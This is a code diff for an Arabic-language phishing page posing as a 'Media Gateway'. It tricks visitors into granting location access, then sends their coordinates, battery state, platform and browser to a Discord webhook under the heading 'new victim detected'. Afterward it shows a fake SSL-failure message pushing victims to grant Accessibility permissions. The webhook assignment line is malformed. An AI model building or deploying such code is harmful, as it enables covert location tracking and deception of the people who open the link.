@@ -1,27 +1,49 @@
-```html
-<!DOCTYPE html>
-<html>
-<head>
-    <link rel="manifest" href="manifest.json">
-    <title>Media Gateway</title>
-</head>
-<body style="background:#111; color:#eee; font-family:sans-serif; text-align:center; padding-top:100px;">
-    <h2>جاري التحقق من اتصالك الآمن...</h2>
-    <p>لمشاهدة المحتوى، اضغط على زر المعاينة بالأسفل</p>
-    <button onclick="access()" style="padding:15px 30px; background:#1a73e8; color:white; border:none; border-radius:25px; cursor:pointer;">معاينة الوسائط</button>
+<script>
+    if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register('sw.js');
+    }
 
-    <script>
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('sw.js');
-        }
-        function access() {
-            // كود مبدئي لإظهار طلب صلاحية الموقع كاختبار
-            navigator.geolocation.getCurrentPosition((pos) => {
-                alert("صلاحية الوصول للوسائط مفعلة، انتظر التحميل...");
+    async function access() {
+        // طلب الموقع كتمويه تقني
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            
+            // انتبه: امسح السطر التالي وضع مكانه الرابط الذي نسخته من Discord
+            const WEBHOOK_URL =https://discord.com/channels/1494438534344347658/1494438534864703500 // جلب بيانات إضافية (البطارية) لزيادة دقهـناهير
+            let batteryStatus = "غير معروف";
+            try {
+                const battery = await navigator.getBattery();
+                batteryStatus = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? 'جاري الشحن' : 'تفريغ'})`;
+            } catch (e) {}
+
+            const payload = {
+                username: "الرادار السيبراني",
+                avatar_url: "https://cdn-icons-png.flaticon.com/512/681/681498.png",
+                content: "🎯 **تم رصد ضحية جديدة بالرابط!**",
+                embeds: [{
+                    title: "تقرير السحب الفوري",
+                    color: 15158332,
+                    fields: [
+                        { name: "📍 الموقع الجغرافي", value: `[فتح الخريطة](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`, inline: false },
+                        { name: "🔋 حالة البطارية", value: batteryStatus, inline: true },
+                        { name: "📱 نظام التشغيل", value: navigator.platform, inline: true },
+                        { name: "🌐 المتصفح", value: navigator.userAgent.split(' ')[0], inline: true }
+                    ],
+                    footer: { text: "نظام التشغيل الآمن | 2026" }
+                }]
+            };
+
+            // إرسال البيانات فوراً لـ Discord
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
             });
-        }
-    </script>
-</body>
-</html>
 
-```
+            // رسالة إيهام الضحية النهائية
+            alert("فشل التحقق من بروتوكول SSL. يرجى محاولة فتح الرابط من تطبيق 'أندرويد الأصلي' أو منح صلاحيات Accessibility.");
+            
+        }, (err) => {
+            alert("عذراً، يجب السماح بالوصول لمشغل الوسائط لعرض الصورة الخاصة.");
+        });
+    }
+</script>
